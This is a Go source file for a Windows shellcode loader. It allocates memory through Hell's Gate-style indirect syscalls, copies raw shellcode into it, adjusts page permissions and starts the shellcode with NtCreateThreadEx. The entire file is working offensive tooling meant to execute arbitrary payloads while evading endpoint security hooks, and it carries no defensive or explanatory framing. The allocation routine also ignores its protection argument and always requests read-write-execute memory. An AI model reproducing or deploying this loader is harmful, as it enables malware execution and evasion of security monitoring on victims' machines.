package main

import (
	"fmt"
	"github.com/scriptchildie/gohellsgate"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func ShellcodeRunnerSyscalls(sc []byte, rwx bool, verbose bool) error {
	modntdll := syscall.NewLazyDLL("Ntdll.dll")
	procrtlMoveMemory := modntdll.NewProc("RtlMoveMemory")

	//var nullRef int
	var flProtect int

	size := len(sc)

	if rwx {
		if verbose {
			fmt.Println("[+] Memory Permissions will be set to RWX")
		}
		flProtect = windows.PAGE_EXECUTE_READWRITE
	} else {
		if verbose {
			fmt.Println("[+] Memory Permissions will be set to RW")
		}
		flProtect = windows.PAGE_READWRITE
	}

	if verbose {
		fmt.Println("[+] Allocating memory for shellcode")
	}

	pHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return fmt.Errorf("Unable to get a handle on current process")
	}

	if verbose {
		fmt.Println("[+] Allocating memory for shellcode using NtAllocateVirtualMemory")
	}
	addr, err := NtAllocateVirtualMemorySyscall("NtAllocateVirtualMemory", uintptr(pHandle), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, flProtect, verbose)
	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemorySyscall: Failed to allocate memory %v\n", err)
	}
	if verbose {
		fmt.Printf("[+] Allocated Memory Address: %p\n", unsafe.Pointer(addr))
	}
	procrtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(size))
	if verbose {
		fmt.Println("[+] Wrote shellcode bytes to destination address")
	}

	//time.Sleep(10 * time.Second)
	if !rwx {
		if verbose {
			fmt.Println("[+] Changing Permissions to RX")
		}
		var oldProtect uint32

		err = NtProtectVirtualMemory("NtProtectVirtualMemory", uintptr(pHandle), addr, uintptr(size), uintptr(windows.PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)), true)
		if err != nil {
			return fmt.Errorf("NtProtectVirtualMemory Failed: %v", err)
		}
	}

	_, err = NtCreateThreadEx("NtCreateThreadEx", uintptr(pHandle), addr, verbose)
	if err != nil {
		return fmt.Errorf("NtCreateThreadEx: Failed to create remote thread %v\n", err)
	}

	return nil
}

func NtAllocateVirtualMemorySyscall(ntapi string, handle uintptr, length uintptr, alloctype int, protect int, verbose bool) (uintptr, error) {
	/*
			__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
		  [in]      HANDLE    ProcessHandle, 1
		  [in, out] PVOID     *BaseAddress,  2
		  [in]      ULONG_PTR ZeroBits,      3
		  [in, out] PSIZE_T   RegionSize,    4
		  [in]      ULONG     AllocationType,5
		  [in]      ULONG     Protect        6
		);*/
	// syscall for NtAllocateVirtualMemory

	var BaseAddress uintptr

	err1, err := gohellsgate.IndirectSyscall(
		ntapi,
		uintptr(unsafe.Pointer(handle)),       //1
		uintptr(unsafe.Pointer(&BaseAddress)), //2
		0,                                     //3
		uintptr(unsafe.Pointer(&length)),      //4
		uintptr(0x3000),                       //5
		0x40,                                  //6
	)
	if err != nil {
		return 0, fmt.Errorf("1 %s %x\n", err, err1)
	}
	if verbose {
		fmt.Printf("[+] Allocated address from NtAllocateVirtualMemory %p\n", unsafe.Pointer(BaseAddress))
	}

	return BaseAddress, nil
}

func NtProtectVirtualMemory(ntapi string, handle, addr uintptr, size uintptr, flNewProtect uintptr, lpflOldProtect uintptr, verbose bool) error {
	err1, err := gohellsgate.IndirectSyscall(
		ntapi,
		handle,
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&size)),
		flNewProtect,
		lpflOldProtect,
	)
	if err != nil {
		return fmt.Errorf("1 %s %x\n", err, err1)
	}
	if verbose {
		fmt.Println("[+] Changed memory permissions")
	}
	return nil
}

func NtCreateThreadEx(ntapi string, handle, BaseAddress uintptr, verbose bool) (uintptr, error) {

	/*
	   typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
	     OUT PHANDLE hThread,               1
	     IN ACCESS_MASK DesiredAccess,	    2
	     IN PVOID ObjectAttributes,	        3
	     IN HANDLE ProcessHandle,		    4
	     IN PVOID lpStartAddress,			5
	     IN PVOID lpParameter,				6
	     IN ULONG Flags,					7
	     IN SIZE_T StackZeroBits,			8
	     IN SIZE_T SizeOfStackCommit,		9
	     IN SIZE_T SizeOfStackReserve,		10
	     OUT PVOID lpBytesBuffer			11
	   );
	*/

	var hThread uintptr
	DesiredAccess := uintptr(0x1FFFFF)
	err1, err := gohellsgate.IndirectSyscall(
		ntapi,
		uintptr(unsafe.Pointer(&hThread)),    //1
		DesiredAccess,                        //2
		0,                                    //3
		uintptr(unsafe.Pointer(handle)),      //4
		uintptr(unsafe.Pointer(BaseAddress)), //5
		0,                                    //6
		uintptr(0),                           //7
		0,                                    //8
		0,                                    //9
		0,                                    //10
		0,
	)
	if err != nil {
		return 0, fmt.Errorf("1 %s %x\n", err, err1)
	}

	if verbose {
		fmt.Printf("[+] Thread Handle: 0x%v\n", hThread)
	}
	syscall.WaitForSingleObject(syscall.Handle(hThread), 0xffffffff)
	return hThread, nil
}
